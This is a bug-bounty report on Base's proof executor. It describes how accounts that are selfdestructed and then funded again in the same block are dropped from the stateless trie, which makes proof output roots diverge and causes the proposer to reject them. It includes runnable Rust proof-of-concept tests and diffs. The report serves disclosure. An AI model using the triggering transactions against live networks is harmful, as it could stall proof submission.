# 75107 bc medium stateless trie drops accounts changed after selfdestruct

**Submitted on Apr 27th 2026 at 09:04:35 UTC by @y4y for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #75107
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/base/base/tree/v0.8.0-rc.24>
* **Impacts:**
  * A bug in the respective layer 0/1/2 network code that results in unintended smart contract behavior with no concrete funds at direct risk

## Description

## Vulnerability Details

The proof executor recomputes state roots from revm's `BundleState`, but it deletes every account for which `bundle_account.was_destroyed()` is true. `AccountStatus::DestroyedChanged` is not pure deletion: the account was destroyed and then modified again in the same block. Canonical L2 execution keeps the final account alive with wiped storage, empty code, and final balance / nonce, while the proof executor removes it from the trie. That produces a different state root and output root for a block that was already accepted on L2. The proposer then rejects that proof result with `RootMismatch` before any L1 proposal call.

## Impact Details

The stateless trie builder collapses all destroyed statuses into the same delete-and-continue branch:

```rust
// base/crates/proof/executor/src/db/mod.rs
fn update_accounts(&mut self, bundle: &BundleState) -> TrieDBResult<()> {
    ...
    for (address, hashed_address, bundle_account) in sorted_state {
        if bundle_account.status.is_not_modified() {
            continue;
        }

        let account_path = Nibbles::unpack(hashed_address.as_slice());

        if bundle_account.was_destroyed() {
            self.root_node.delete(&account_path, &self.fetcher)?;
            self.storage_roots.remove(address);
            continue;
        }
        ...
    }
}
```

The rebuilt proof header commits the state root returned by that trie logic:

```rust
// base/crates/proof/executor/src/builder/assemble.rs
pub(crate) fn seal_block(
    &mut self,
    attrs: &BasePayloadAttributes,
    parent_hash: B256,
    block_env: &BlockEnv,
    ex_result: &BlockExecutionResult<BaseReceiptEnvelope>,
    bundle: BundleState,
) -> ExecutorResult<Sealed<Header>> {
    let timestamp = block_env.timestamp.saturating_to::<u64>();

    let state_root = self.trie_db.state_root(&bundle)?;
    ...
}
```

The proposer performs a just-in-time comparison against canonical output roots and rejects mismatches before any L1 proposal call is made:

```rust
// base/crates/proof/proposer/src/pipeline.rs
let canonical_output = self
    .rollup_client
    .output_at_block(target_block)
    .await
    .map_err(|e| SubmitAction::Failed(ProposerError::Rpc(e)))?;

if aggregate_proposal.output_root != canonical_output.output_root {
    warn!(
        proposal_root = ?aggregate_proposal.output_root,
        canonical_root = ?canonical_output.output_root,
        target_block,
        "Proposal output root does not match canonical chain at submit time"
    );
    return Err(SubmitAction::RootMismatch);
}
```

Concrete example from the verified local PoC:

{% stepper %}
{% step %}

## Block `1`

Prefunds the future create address with `1000` wei.
{% endstep %}

{% step %}

## Block `2`

Deploys constructor code that executes `SSTORE(0, 0x42)` and `SELFDESTRUCT`.
{% endstep %}

{% step %}

## The same block `2`

Transfers `2000` wei to that same address.
{% endstep %}

{% step %}

## Canonical execution ends with

* `AccountStatus::DestroyedChanged`
* `code len = 0`
* `slot0 = 0`
* `balance = 2000`
  {% endstep %}

{% step %}

## The proof executor derives

* buggy state root: `0x443ea453d90e4d52d64e07ce747e53bfe56cd568d4f5edf52aa63312ec1b3c91`
* canonical state root: `0xcdafa1d0435a39b2e55ab5ec3e4965c9bcb3e713ea6f1f44c386fae56c18641e`
  {% endstep %}

{% step %}

## That becomes

* buggy output root: `0xf8c1b0b2adb3515056251df4c6c726d9a76ba57c572b10396291730e98ddb732`
* canonical output root: `0x7ff3e56b93374b297b93858a6f691def2f6b8e190b3bc64a5e9709425c8b0e73`
  {% endstep %}

{% step %}

## The proposer validation path returns `RootMismatch`.

{% endstep %}

{% step %}

## The L1 output proposer is never called.

{% endstep %}
{% endstepper %}

**Pre-conditions**

* A proved L2 block contains an account that ends the block as `DestroyedChanged`.
* The proof executor uses `TrieDB::state_root()` to rebuild the block state root from the block bundle.
* The proposer validates the proof output root against `rollup_client.output_at_block(target_block)`.

This can be triggered by ordinary L2 transactions. It does not require malformed payloads, privileged operator input, or a trusted-role mistake.

## References

* base/crates/proof/executor/src/db/mod.rs:164-224
* base/crates/proof/executor/src/builder/assemble.rs:31-42
* base/crates/proof/proposer/src/pipeline.rs:1048-1175

## Link to Proof of Concept

<https://gist.github.com/brandonshiyay/6b9ce19b9e132cd71eca1d550aaff13f>

## Proof of Concept

```rust
#![cfg(feature = "test-utils")]
#![allow(missing_docs)]

use alloy_network::{EthereumWallet, TransactionBuilder};
use alloy_primitives::{Address, Bytes, Sealable, TxKind, U256, keccak256};
use alloy_provider::{Provider, ProviderBuilder, network::primitives::BlockTransactions};
use alloy_rpc_types_eth::TransactionRequest;
use alloy_rlp::{Decodable, Encodable};
use alloy_trie::{Nibbles, TrieAccount};
use base_common_consensus::Predeploys;
use base_node_core::utils::setup;
use base_proof_executor::{TrieDB, TrieDBProvider};
use base_proof_mpt::{NoopTrieHinter, TrieNode, TrieProvider};
use base_protocol::OutputRoot;
use futures::StreamExt;
use reth_storage_api::StateProviderFactory;
use revm::database::{AccountStatus, BundleAccount, BundleState};
use std::collections::BTreeMap;

const MAX_FEE_PER_GAS: u128 = 20_000_000_000;
const MAX_PRIORITY_FEE_PER_GAS: u128 = 1_000_000_000;
const PREFUND_VALUE: u128 = 1_000;
const FUNDING_VALUE: u128 = 2_000;

fn deploy_tx(from: Address, nonce: u64, init_code: Bytes) -> TransactionRequest {
    TransactionRequest::default()
        .with_from(from)
        .with_nonce(nonce)
        .with_gas_limit(500_000)
        .with_max_fee_per_gas(MAX_FEE_PER_GAS)
        .with_max_priority_fee_per_gas(MAX_PRIORITY_FEE_PER_GAS)
        .with_input(init_code)
        .with_kind(TxKind::Create)
}

fn transfer_tx(from: Address, to: Address, nonce: u64, value: U256) -> TransactionRequest {
    TransactionRequest::default()
        .with_from(from)
        .with_to(to)
        .with_nonce(nonce)
        .with_value(value)
        .with_gas_limit(21_000)
        .with_max_fee_per_gas(MAX_FEE_PER_GAS)
        .with_max_priority_fee_per_gas(MAX_PRIORITY_FEE_PER_GAS)
}

/// Init code for a contract that writes storage and selfdestructs during construction.
///
/// That same-tx creation path still produces a destroyed account under modern SELFDESTRUCT rules.
fn selfdestruct_in_constructor_init_code() -> Bytes {
    let mut init = Vec::new();
    init.extend_from_slice(&[0x60, 0x42, 0x60, 0x00, 0x55]); // SSTORE(0, 0x42)
    init.extend_from_slice(&[
        0x73, // PUSH20
        0xde, 0xad, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x01, // beneficiary
    ]);
    init.push(0xff); // SELFDESTRUCT
    Bytes::from(init)
}

#[derive(Clone, Debug)]
struct ProofTrieProvider {
    trie_nodes: BTreeMap<alloy_primitives::B256, Bytes>,
}

impl ProofTrieProvider {
    fn from_account_proof(proof: &[Bytes]) -> Self {
        let trie_nodes = proof
            .iter()
            .cloned()
            .map(|node| (keccak256(node.as_ref()), node))
            .collect();
        Self { trie_nodes }
    }
}

impl TrieProvider for ProofTrieProvider {
    type Error = eyre::Error;

    fn trie_node_by_hash(&self, key: alloy_primitives::B256) -> Result<TrieNode, Self::Error> {
        let node = self
            .trie_nodes
            .get(&key)
            .ok_or_else(|| eyre::eyre!("missing trie node preimage for hash {key:?}"))?;
        TrieNode::decode(&mut node.as_ref())
            .map_err(|err| eyre::eyre!("failed to decode trie node for {key:?}: {err}"))
    }
}

impl TrieDBProvider for ProofTrieProvider {
    fn bytecode_by_hash(&self, code_hash: alloy_primitives::B256) -> Result<Bytes, Self::Error> {
        eyre::bail!("unexpected bytecode lookup for code hash {code_hash:?}")
    }

    fn header_by_hash(
        &self,
        hash: alloy_primitives::B256,
    ) -> Result<alloy_consensus::Header, Self::Error> {
        eyre::bail!("unexpected header lookup for hash {hash:?}")
    }
}

fn destroyed_changed_bundle(address: Address, account: &BundleAccount) -> BundleState {
    let mut bundle = BundleState::default();
    bundle.state.insert(address, account.clone());
    bundle
}

fn buggy_root_from_account_update(
    parent_header: alloy_consensus::Sealed<alloy_consensus::Header>,
    provider: ProofTrieProvider,
    address: Address,
    account: &BundleAccount,
) -> eyre::Result<alloy_primitives::B256> {
    let bundle = destroyed_changed_bundle(address, account);
    let mut trie_db = TrieDB::new(parent_header, provider, NoopTrieHinter);
    trie_db
        .state_root(&bundle)
        .map_err(|err| eyre::eyre!("buggy TrieDB root calculation failed: {err}"))
}

fn correct_root_from_account_update(
    parent_header: alloy_consensus::Sealed<alloy_consensus::Header>,
    provider: ProofTrieProvider,
    address: Address,
    account: &BundleAccount,
) -> eyre::Result<alloy_primitives::B256> {
    let account_info = account
        .account_info()
        .ok_or_else(|| eyre::eyre!("DestroyedChanged account missing final account info"))?;
    let mut root = TrieDB::new(parent_header, provider.clone(), NoopTrieHinter).take_root_node();
    let account_path = Nibbles::unpack(keccak256(address.as_slice()).as_slice());
    let trie_account = TrieAccount {
        nonce: account_info.nonce,
        balance: account_info.balance,
        storage_root: alloy_consensus::EMPTY_ROOT_HASH,
        code_hash: account_info.code_hash,
    };
    let mut encoded_account = Vec::with_capacity(trie_account.length());
    trie_account.encode(&mut encoded_account);
    root.insert(&account_path, encoded_account.into(), &provider)
        .map_err(|err| eyre::eyre!("correct account reinsertion failed: {err}"))?;
    Ok(root.blind())
}

#[tokio::test(flavor = "multi_thread")]
async fn m09_same_block_destroyed_changed_replay_diverges() -> eyre::Result<()> {
    let (mut nodes, wallet) = setup(1).await?;
    let mut node = nodes.pop().expect("missing node");
    let signer = wallet.inner.clone();
    let provider =
        ProviderBuilder::new().wallet(EthereumWallet::new(signer.clone())).connect_http(node.rpc_url());

    let future_contract_address = signer.address().create(1);

    let prefund_tx_hash = *provider
        .send_transaction(transfer_tx(
            signer.address(),
            future_contract_address,
            0,
            U256::from(PREFUND_VALUE),
        ))
        .await?
        .tx_hash();
    node.advance_block().await?;
    let _ = node
        .canonical_stream
        .next()
        .await
        .expect("missing prefund canonical notification");

    assert_eq!(
        provider.get_balance(future_contract_address).await?,
        U256::from(PREFUND_VALUE),
        "future contract address should exist before the trigger block"
    );
    assert!(
        provider.get_code_at(future_contract_address).await?.is_empty(),
        "prefunded future address should still be code-less"
    );

    let deploy_pending = provider
        .send_transaction(deploy_tx(
            signer.address(),
            1,
            selfdestruct_in_constructor_init_code(),
        ))
        .await?;
    let deploy_tx_hash = *deploy_pending.tx_hash();
    let funding_pending = provider
        .send_transaction(transfer_tx(
            signer.address(),
            future_contract_address,
            2,
            U256::from(FUNDING_VALUE),
        ))
        .await?;
    let funding_tx_hash = *funding_pending.tx_hash();

    let payload = node.advance_block().await?;
    let block_number = payload.block().number;

    let notification = node.canonical_stream.next().await.expect("missing canonical notification");
    let committed = notification.committed();
    let execution_outcome = committed.execution_outcome();
    let account_state = execution_outcome
        .bundle
        .account(&future_contract_address)
        .expect("expected funded post-selfdestruct account in bundle");

    let code = provider.get_code_at(future_contract_address).await?;
    let balance = provider.get_balance(future_contract_address).await?;
    let slot0 = provider.get_storage_at(future_contract_address, U256::ZERO).await?;

    assert_eq!(account_state.status, AccountStatus::DestroyedChanged);
    assert!(code.is_empty(), "account should remain code-less after same-block funding");
    assert_eq!(slot0, U256::ZERO, "destroyed storage should stay wiped");
    assert_eq!(balance, U256::from(FUNDING_VALUE), "funding transfer should recreate balance");
    assert!(
        account_state.storage.iter().all(|(_, slot)| slot.present_value.is_zero()),
        "PoC expects no surviving nonzero storage slots after same-tx selfdestruct"
    );

    let executing_block = provider
        .get_block_by_number(block_number.into())
        .await?
        .expect("executing block not found");
    let parent_block = provider
        .get_block_by_number((block_number - 1).into())
        .await?
        .expect("parent block not found");
    let parent_state_provider = node
        .inner
        .provider
        .state_by_block_hash(parent_block.header.inner.hash_slow())?;
    let parent_proof = parent_state_provider.proof(
        Default::default(),
        future_contract_address,
        &[],
    )?;

    let canonical_tx_hashes = match &executing_block.transactions {
        BlockTransactions::Hashes(transactions) => transactions.clone(),
        _ => eyre::bail!("expected hash-only block transactions"),
    };
    let parent_state_root = parent_block.header.inner.state_root;
    let parent_header = parent_block.header.inner.clone().seal_slow();

    assert!(
        canonical_tx_hashes.contains(&deploy_tx_hash),
        "canonical block did not include deployment transaction"
    );
    assert!(
        canonical_tx_hashes.contains(&funding_tx_hash),
        "canonical block did not include funding transaction"
    );
    parent_proof
        .verify(parent_state_root)
        .map_err(|err| eyre::eyre!("parent proof does not match parent state root: {err}"))?;

    let changed_bundle =
        destroyed_changed_bundle(future_contract_address, account_state);
    let mut destroyed_only_account = account_state.clone();
    destroyed_only_account.info = None;
    let destroyed_only_bundle =
        destroyed_changed_bundle(future_contract_address, &destroyed_only_account);

    let buggy_witness = parent_state_provider.witness(
        Default::default(),
        parent_state_provider.hashed_post_state(&destroyed_only_bundle),
    )?;
    let correct_witness = parent_state_provider.witness(
        Default::default(),
        parent_state_provider.hashed_post_state(&changed_bundle),
    )?;

    let buggy_root = buggy_root_from_account_update(
        parent_header.clone(),
        ProofTrieProvider::from_account_proof(&buggy_witness),
        future_contract_address,
        account_state,
    )?;
    let correct_root = correct_root_from_account_update(
        parent_header,
        ProofTrieProvider::from_account_proof(&correct_witness),
        future_contract_address,
        account_state,
    )?;
    let current_state_provider = node
        .inner
        .provider
        .state_by_block_hash(executing_block.header.inner.hash_slow())?;
    let previous_message_passer = parent_state_provider
        .proof(Default::default(), Predeploys::L2_TO_L1_MESSAGE_PASSER, &[])?
        .into_eip1186_response(Vec::new());
    let previous_output_root = OutputRoot::from_parts(
        parent_block.header.inner.state_root,
        previous_message_passer.storage_hash,
        parent_block.header.inner.hash_slow(),
    )
    .hash();
    let executing_message_passer = current_state_provider
        .proof(Default::default(), Predeploys::L2_TO_L1_MESSAGE_PASSER, &[])?
        .into_eip1186_response(Vec::new());
    let canonical_output_root = OutputRoot::from_parts(
        correct_root,
        executing_message_passer.storage_hash,
        executing_block.header.inner.hash_slow(),
    )
    .hash();
    let buggy_output_root = OutputRoot::from_parts(
        buggy_root,
        executing_message_passer.storage_hash,
        executing_block.header.inner.hash_slow(),
    )
    .hash();

    println!("M-09 trigger block: {block_number}");
    println!("future contract address: {future_contract_address}");
    println!("prefund tx hash: {prefund_tx_hash:?}");
    println!("deploy tx hash: {deploy_tx_hash:?}");
    println!("funding tx hash: {funding_tx_hash:?}");
    println!("canonical account status: {:?}", account_state.status);
    println!("canonical code len: {}", code.len());
    println!("canonical balance: {balance}");
    println!("canonical slot0: {}", slot0);
    println!("parent state root: {parent_state_root:?}");
    println!("buggy trie witness nodes: {}", buggy_witness.len());
    println!("correct trie witness nodes: {}", correct_witness.len());
    println!("buggy proof trie root: {buggy_root:?}");
    println!("correct proof trie root: {correct_root:?}");
    println!("previous output root: {previous_output_root:?}");
    println!("canonical output root: {canonical_output_root:?}");
    println!("buggy proof output root: {buggy_output_root:?}");

    assert_ne!(
        buggy_root,
        correct_root,
        "DestroyedChanged account update unexpectedly produced the same trie root"
    );
    assert_ne!(
        buggy_output_root,
        canonical_output_root,
        "buggy proof output root unexpectedly matched the canonical L2 output root"
    );

    let scenario_path = std::env::var_os("M09_SCENARIO_PATH")
        .map(std::path::PathBuf::from)
        .unwrap_or_else(|| std::path::PathBuf::from("target/m09-scenario.json"));
    if let Some(parent) = scenario_path.parent() {
        std::fs::create_dir_all(parent)?;
    }
    std::fs::write(
        &scenario_path,
        serde_json::to_vec_pretty(&serde_json::json!({
            "target_block": block_number,
            "future_contract_address": format!("{future_contract_address:?}"),
            "prefund_tx_hash": format!("{prefund_tx_hash:?}"),
            "deploy_tx_hash": format!("{deploy_tx_hash:?}"),
            "funding_tx_hash": format!("{funding_tx_hash:?}"),
            "account_status": format!("{:?}", account_state.status),
            "code_len": code.len(),
            "balance": balance.to_string(),
            "slot0": slot0.to_string(),
            "buggy_witness_nodes": buggy_witness.len(),
            "correct_witness_nodes": correct_witness.len(),
            "canonical_state_root": format!("{correct_root:?}"),
            "buggy_state_root": format!("{buggy_root:?}"),
            "previous_output_root": format!("{previous_output_root:?}"),
            "canonical_output_root": format!("{canonical_output_root:?}"),
            "buggy_output_root": format!("{buggy_output_root:?}")
        }))?,
    )?;
    println!("scenario json: {}", scenario_path.display());

    Ok(())
}
```

The above file should be added to `crates/proof/executor/tests/destroyed_changed_poc.rs`. This is meant to demonstrate the transaction which can lead to the incorrect proof root being computed.

```rust
#![allow(missing_docs)]

use std::{
    path::PathBuf,
    sync::{
        Arc,
        atomic::{AtomicUsize, Ordering},
    },
    time::Duration,
};

use alloy_primitives::{Address, B256, Bytes};
use async_trait::async_trait;
use base_proof_primitives::{ProofResult, Proposal, ProverClient};
use base_proposer::{
    DriverConfig, OutputProposer, PipelineConfig, ProvingPipeline, ProposerError,
    test_utils::{
        MockAggregateVerifier, MockAnchorStateRegistry, MockDisputeGameFactory, MockL1, MockL2,
        MockProver, MockRollupClient, test_anchor_root, test_sync_status,
    },
};
use tokio_util::sync::CancellationToken;

const BLOCK_INTERVAL: u64 = 1;
const TEST_GAME_TYPE: u32 = 42;
const MOCK_PROVER_DELAY: Duration = Duration::from_millis(1);

type PocPipeline = ProvingPipeline<
    MockL1,
    MockL2,
    MockRollupClient,
    MockAnchorStateRegistry,
    MockDisputeGameFactory,
>;

#[derive(Debug)]
struct RecordingOutputProposer {
    calls: Arc<AtomicUsize>,
}

#[async_trait]
impl OutputProposer for RecordingOutputProposer {
    async fn propose_output(
        &self,
        _proposal: &Proposal,
        _parent_address: Address,
        _intermediate_roots: &[B256],
    ) -> Result<(), ProposerError> {
        self.calls.fetch_add(1, Ordering::SeqCst);
        Ok(())
    }
}

fn submission_pipeline(
    output_roots: std::collections::HashMap<u64, B256>,
    output_proposer: Arc<dyn OutputProposer>,
) -> PocPipeline {
    let cancel = CancellationToken::new();
    let l1 = Arc::new(MockL1 { latest_block_number: 1000 });
    let l2 = Arc::new(MockL2 { block_not_found: true, canonical_hash: None });
    let prover: Arc<dyn ProverClient> =
        Arc::new(MockProver { delay: MOCK_PROVER_DELAY, block_interval: BLOCK_INTERVAL });
    let rollup = Arc::new(MockRollupClient {
        sync_status: test_sync_status(0, B256::ZERO),
        output_roots,
        max_safe_block: None,
    });
    let anchor_registry = Arc::new(MockAnchorStateRegistry { anchor_root: test_anchor_root(0) });

    ProvingPipeline::new(
        PipelineConfig {
            max_parallel_proofs: 1,
            max_retries: 1,
            recovery_scan_concurrency: 1,
            tee_prover_registry_address: None,
            driver: DriverConfig {
                game_type: TEST_GAME_TYPE,
                block_interval: BLOCK_INTERVAL,
                intermediate_block_interval: BLOCK_INTERVAL,
                ..Default::default()
            },
        },
        prover,
        l1,
        l2,
        rollup,
        anchor_registry,
        Arc::new(MockDisputeGameFactory::with_games(vec![])),
        Arc::new(MockAggregateVerifier::default()),
        output_proposer,
        cancel,
    )
}

fn required_u64(value: &serde_json::Value, key: &str) -> eyre::Result<u64> {
    value[key].as_u64().ok_or_else(|| eyre::eyre!("missing u64 field `{key}`"))
}

fn required_str<'a>(value: &'a serde_json::Value, key: &str) -> eyre::Result<&'a str> {
    value[key].as_str().ok_or_else(|| eyre::eyre!("missing string field `{key}`"))
}

#[tokio::main(flavor = "current_thread")]
async fn main() -> eyre::Result<()> {
    let scenario_path = std::env::args_os()
        .nth(1)
        .map(PathBuf::from)
        .unwrap_or_else(|| PathBuf::from("target/m09-scenario.json"));

    let raw = std::fs::read_to_string(&scenario_path)?;
    let scenario: serde_json::Value = serde_json::from_str(&raw)?;

    let target_block = required_u64(&scenario, "target_block")?;
    let previous_output_root: B256 = required_str(&scenario, "previous_output_root")?.parse()?;
    let canonical_output_root: B256 = required_str(&scenario, "canonical_output_root")?.parse()?;
    let buggy_output_root: B256 = required_str(&scenario, "buggy_output_root")?.parse()?;

    let proposal = Proposal {
        output_root: buggy_output_root,
        signature: Bytes::from(vec![0xab; 65]),
        l1_origin_hash: B256::repeat_byte(0x22),
        l1_origin_number: 0,
        l2_block_number: target_block,
        prev_output_root: previous_output_root,
        config_hash: B256::repeat_byte(0x44),
    };
    let proof_result =
        ProofResult::Tee { aggregate_proposal: proposal.clone(), proposals: vec![proposal] };

    let proposer_calls = Arc::new(AtomicUsize::new(0));
    let pipeline = submission_pipeline(
        std::collections::HashMap::from([(target_block, canonical_output_root)]),
        Arc::new(RecordingOutputProposer { calls: Arc::clone(&proposer_calls) }),
    );

    let submit_result =
        pipeline.validate_and_submit_for_poc(&proof_result, target_block, Address::ZERO).await;

    assert!(
        matches!(&submit_result, Err(err) if err == "RootMismatch"),
        "the proposer validation path should reject the buggy proof before any L1 proposal call"
    );
    assert_eq!(
        proposer_calls.load(Ordering::SeqCst),
        0,
        "L1 output proposer must never be called when the proof root mismatches canonical L2"
    );

    println!("scenario json: {}", scenario_path.display());
    println!("target block: {target_block}");
    println!("deploy tx hash: {}", required_str(&scenario, "deploy_tx_hash")?);
    println!("funding tx hash: {}", required_str(&scenario, "funding_tx_hash")?);
    println!("canonical bundle account status: {}", required_str(&scenario, "account_status")?);
    println!("canonical code len: {}", required_u64(&scenario, "code_len")?);
    println!("canonical balance: {}", required_str(&scenario, "balance")?);
    println!("canonical slot0: {}", required_str(&scenario, "slot0")?);
    println!("buggy trie witness nodes: {}", required_u64(&scenario, "buggy_witness_nodes")?);
    println!("correct trie witness nodes: {}", required_u64(&scenario, "correct_witness_nodes")?);
    println!("canonical block state root: {}", required_str(&scenario, "canonical_state_root")?);
    println!("buggy proof state root: {}", required_str(&scenario, "buggy_state_root")?);
    println!("previous output root: {}", required_str(&scenario, "previous_output_root")?);
    println!("canonical output root: {}", required_str(&scenario, "canonical_output_root")?);
    println!("buggy proof output root: {}", required_str(&scenario, "buggy_output_root")?);
    println!("proposer validation result: {}", submit_result.unwrap_err());
    println!("L1 proposer calls: {}", proposer_calls.load(Ordering::SeqCst));

    Ok(())
}
```

This is the second half of the entire PoC chain, add to `crates/proof/proposer/examples/validate_buggy_proof_result.rs`. This will demonstrate how the proof generated in part 1 of PoC would be handled by a proposer for validation.

Then for those files:

* `crates/proof/proposer/src/lib.rs`
* `crates/proof/proposer/src/pipeline.rs`
* `crates/proof/proposer/Cargo.toml`

These PoC-only changes expose the final proposer validation stage without running the full coordinator:

```diff
diff --git a/base/crates/proof/proposer/src/lib.rs b/base/crates/proof/proposer/src/lib.rs
--- a/base/crates/proof/proposer/src/lib.rs
+++ b/base/crates/proof/proposer/src/lib.rs
@@
-#[cfg(test)]
+#[cfg(any(test, feature = "poc-utils"))]
 pub mod test_utils;
diff --git a/base/crates/proof/proposer/src/pipeline.rs b/base/crates/proof/proposer/src/pipeline.rs
--- a/base/crates/proof/proposer/src/pipeline.rs
+++ b/base/crates/proof/proposer/src/pipeline.rs
@@
+    #[cfg(any(test, feature = "poc-utils"))]
+    pub async fn validate_and_submit_for_poc(
+        &self,
+        proof_result: &ProofResult,
+        target_block: u64,
+        parent_address: Address,
+    ) -> Result<(), String> {
+        self.validate_and_submit(proof_result, target_block, parent_address)
+            .await
+            .map_err(|action| match action {
+                SubmitAction::RootMismatch => "RootMismatch".to_string(),
+                SubmitAction::Failed(err) => format!("Failed: {err}"),
+                SubmitAction::GameAlreadyExists => "GameAlreadyExists".to_string(),
+                SubmitAction::Discard(err) => format!("Discard: {err}"),
+            })
+    }
diff --git a/base/crates/proof/proposer/Cargo.toml b/base/crates/proof/proposer/Cargo.toml
--- a/base/crates/proof/proposer/Cargo.toml
+++ b/base/crates/proof/proposer/Cargo.toml
@@
+poc-utils = [ "dep:alloy-rpc-types-eth", "dep:base-consensus-genesis", "dep:serde_json" ]
```
